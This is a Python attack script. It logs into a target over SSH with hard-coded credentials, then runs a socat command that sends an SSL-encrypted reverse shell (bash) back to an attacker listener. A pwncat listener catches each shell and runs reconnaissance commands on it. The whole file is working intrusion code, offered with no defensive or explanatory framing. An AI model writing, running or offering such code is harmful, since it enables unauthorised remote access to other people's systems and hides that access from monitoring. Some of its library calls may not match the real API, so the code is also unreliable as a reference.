import paramiko
import pwncat
import time
from multiprocessing import Process

# Target SSH credentials
target_host = "192.168.1.100"
target_port = 22
username = "targetuser"
password = "targetpassword"

# Attacker listener details
attacker_host = "192.168.1.50"
attacker_port = 4444

# SSL certificate and key paths
cert_path = "/path/to/cert.pem"
key_path = "/path/to/key.pem"

# Function to handle a session in a separate process
def handle_session(session):
    print(f"[+] New SSL session from {session.client}")
    print("Running whoami...")
    print(session.run("whoami"))
    print("Running uname -a...")
    print(session.run("uname -a"))
    session.close()

# Start pwncat listener with SSL
listener = pwncat.listen(
    f"ssl://{attacker_host}:{attacker_port}",
    ssl_cert=cert_path,
    ssl_key=key_path
)

# Define callback to spawn a new process per session
def on_session_established(session):
    proc = Process(target=handle_session, args=(session,))
    proc.start()

listener.established = on_session_established

# Connect to target via SSH using Paramiko
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(target_host, port=target_port, username=username, password=password)

# Deploy socat reverse shell with SSL
reverse_shell_cmd = (
    f"socat - OPENSSL:{attacker_host}:{attacker_port},verify=0 "
    f"EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &"
)

stdin, stdout, stderr = ssh.exec_command(reverse_shell_cmd)
print("[*] SSL reverse shell command sent via SSH")

# Close SSH connection
ssh.close()

# Wait for reverse shell connections
print("[*] Listening for incoming SSL reverse shells...")
listener.run()
